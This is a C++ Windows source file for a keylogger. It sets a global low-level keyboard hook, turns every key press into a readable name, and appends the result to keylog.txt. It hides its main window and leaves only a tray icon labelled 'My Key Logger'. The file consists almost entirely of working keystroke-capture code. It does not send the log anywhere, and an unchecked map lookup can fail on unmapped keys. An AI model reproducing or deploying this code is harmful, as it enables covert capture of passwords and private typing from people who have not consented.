#include <Windows.h>
#include <fstream>
#include <map>

using namespace std;

// Global variables
std::ofstream logFile;
HHOOK keyboardHook = NULL;
NOTIFYICONDATA notifyIconData;

auto getVKCodeValue(DWORD vkCode) {
    map <DWORD, string> vkcodes;
    vkcodes[1] = "Left mouse button";
    vkcodes[2] = "Right mouse button";
    vkcodes[3] = "Control-break processing";
    vkcodes[4] = "Middle mouse button (three-button mouse)";
    vkcodes[5] = "WIN 2000: X1 mouse button";
    vkcodes[6] = "WIN 2000: X2 mouse button";
    vkcodes[7] = "Undefined";
    vkcodes[8] = "BckS";
    vkcodes[9] = "TAB";
    vkcodes[12] = "CLEAR";
    vkcodes[13] = "ENTER";
    vkcodes[16] = "SHIFT";
    vkcodes[17] = "CTRL";
    vkcodes[18] = "ALT";
    vkcodes[19] = "PAUSE";
    vkcodes[20] = "CAPS LOCK";
    vkcodes[21] = "IME Kana mode";
    vkcodes[22] = "IME Hanguel mode";
    vkcodes[23] = "IME Hangul mode";
    vkcodes[24] = "IME Junja mode";
    vkcodes[25] = "IME final mode";
    vkcodes[26] = "IME Hanja mode";
    vkcodes[27] = "ESC";
    vkcodes[28] = "IME convert";
    vkcodes[29] = "IME nonconvert";
    vkcodes[30] = "IME accept";
    vkcodes[31] = "IME mode change request";
    vkcodes[32] = " ";
    vkcodes[33] = "PUP";
    vkcodes[34] = "PDOWN";
    vkcodes[35] = "END";
    vkcodes[36] = "HOME";
    vkcodes[37] = "LARR";
    vkcodes[38] = "UARR";
    vkcodes[39] = "RARR";
    vkcodes[40] = "DARR";
    vkcodes[41] = "SELECT";
    vkcodes[42] = "PRINT";
    vkcodes[43] = "EXECUTE";
    vkcodes[44] = "PRTSC";
    vkcodes[45] = "INS";
    vkcodes[46] = "DEL";
    vkcodes[47] = "HELP";
    vkcodes[48] = "0";
    vkcodes[49] = "1";
    vkcodes[50] = "2";
    vkcodes[51] = "3";
    vkcodes[52] = "4";
    vkcodes[53] = "5";
    vkcodes[54] = "6";
    vkcodes[55] = "7";
    vkcodes[56] = "8";
    vkcodes[57] = "9";
    vkcodes[65] = "A";
    vkcodes[66] = "B";
    vkcodes[67] = "C";
    vkcodes[68] = "D";
    vkcodes[69] = "E";
    vkcodes[70] = "F";
    vkcodes[71] = "G";
    vkcodes[72] = "H";
    vkcodes[73] = "I";
    vkcodes[74] = "J";
    vkcodes[75] = "K";
    vkcodes[76] = "L";
    vkcodes[77] = "M";
    vkcodes[78] = "N";
    vkcodes[79] = "O";
    vkcodes[80] = "P";
    vkcodes[81] = "Q";
    vkcodes[82] = "R";
    vkcodes[83] = "S";
    vkcodes[84] = "T";
    vkcodes[85] = "U";
    vkcodes[86] = "V";
    vkcodes[87] = "W";
    vkcodes[88] = "X";
    vkcodes[89] = "Y";
    vkcodes[90] = "Z";
    vkcodes[91] = "LWIN";
    vkcodes[92] = "RWIN";
    vkcodes[93] = "APP";
    vkcodes[94] = "Reserved";
    vkcodes[95] = "Computer Sleep";
    vkcodes[96] = "NUMPAD0";
    vkcodes[97] = "NUMPAD1";
    vkcodes[98] = "NUMPAD2";
    vkcodes[99] = "NUMPAD3";
    vkcodes[100] = "NUMPAD4";
    vkcodes[101] = "NUMPAD5";
    vkcodes[102] = "NUMPAD6";
    vkcodes[103] = "NUMPAD7";
    vkcodes[104] = "NUMPAD8";
    vkcodes[105] = "NUMPAD9";
    vkcodes[106] = "Multiply";
    vkcodes[107] = "Add";
    vkcodes[108] = "Separator";
    vkcodes[109] = "Subtract";
    vkcodes[110] = "Decimal";
    vkcodes[111] = "Divide";
    vkcodes[112] = "F1";
    vkcodes[113] = "F2";
    vkcodes[114] = "F3";
    vkcodes[115] = "F4";
    vkcodes[116] = "F5";
    vkcodes[117] = "F6";
    vkcodes[118] = "F7";
    vkcodes[119] = "F8";
    vkcodes[120] = "F9";
    vkcodes[121] = "F10";
    vkcodes[122] = "F11";
    vkcodes[123] = "F12";
    vkcodes[124] = "F13";
    vkcodes[125] = "F14";
    vkcodes[126] = "F15";
    vkcodes[127] = "F16";
    vkcodes[144] = "NUMLOCK";
    vkcodes[160] = "LSHIFT";
    vkcodes[161] = "RSHIFT";
    vkcodes[162] = "LCNTRL";
    vkcodes[163] = "RCNTRL";

    return vkcodes.find(vkCode);
}

// Function to handle key press and write to log file
void HandleKeyPress(DWORD vkCode)
{
    // Open the log file in append mode
    logFile.open("keylog.txt", ios_base::app);

    // Write the key code to the log file
    logFile << getVKCodeValue(vkCode)->second;

    // Close the log file
    logFile.close();
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // Extract key information from the event
        KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vkCode = pKeyboardStruct->vkCode;
        DWORD flags = pKeyboardStruct->flags;

        // Check if a key is being pressed (key down event)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // Handle the key press
            HandleKeyPress(vkCode);
        }
    }

    // Pass the event to the next hook procedure
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Window procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
        case WM_CREATE:
        {
            // Set up the keyboard hook
            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
            if (keyboardHook == NULL)
            {
                MessageBox(hwnd, "Failed to set up keyboard hook.", "Error", MB_OK | MB_ICONERROR);
                DestroyWindow(hwnd);
                return -1;
            }

            // Set up the system tray icon
            ZeroMemory(&notifyIconData, sizeof(NOTIFYICONDATA));
            notifyIconData.cbSize = sizeof(NOTIFYICONDATA);
            notifyIconData.hWnd = hwnd;
            notifyIconData.uID = 1;
            notifyIconData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
            notifyIconData.uCallbackMessage = WM_USER + 1;
            notifyIconData.hIcon = LoadIcon(NULL, IDI_APPLICATION);
            lstrcpy(notifyIconData.szTip, "My Key Logger");
            Shell_NotifyIcon(NIM_ADD, &notifyIconData);

            // Minimize the window
            ShowWindow(hwnd, SW_HIDE);
            break;
        }

        case WM_CLOSE:
            // Unhook the keyboard hook
            if (keyboardHook != NULL)
            {
                UnhookWindowsHookEx(keyboardHook);
                keyboardHook = NULL;
            }

            // Remove the system tray icon
            Shell_NotifyIcon(NIM_DELETE, &notifyIconData);

            DestroyWindow(hwnd);
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        case WM_USER + 1:
            // Handle system tray icon messages
            switch (lParam)
            {
                case WM_LBUTTONDOWN:
                    // Show or hide the window when the left mouse button is clicked on the system tray icon
                    ShowWindow(hwnd, IsWindowVisible(hwnd) ? SW_HIDE : SW_SHOW);
                    break;
            }

            break;

        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    return 0;
}

// Entry point of the application
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Register the window class
    const char *CLASS_NAME = "MyWindowClass";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    if (!RegisterClass(&wc))
    {
        MessageBox(NULL, "Failed to register window class.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // Create the window
    HWND hwnd = CreateWindowEx(
            0,
            CLASS_NAME,
            "My Key Logger",
            WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
            NULL,
            NULL,
            hInstance,
            NULL
    );

    if (hwnd == NULL)
    {
        MessageBox(NULL, "Failed to create window.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        if (!TranslateAccelerator(hwnd, NULL, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    // Cleanup
    if (keyboardHook != NULL)
    {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }

    return 0;
}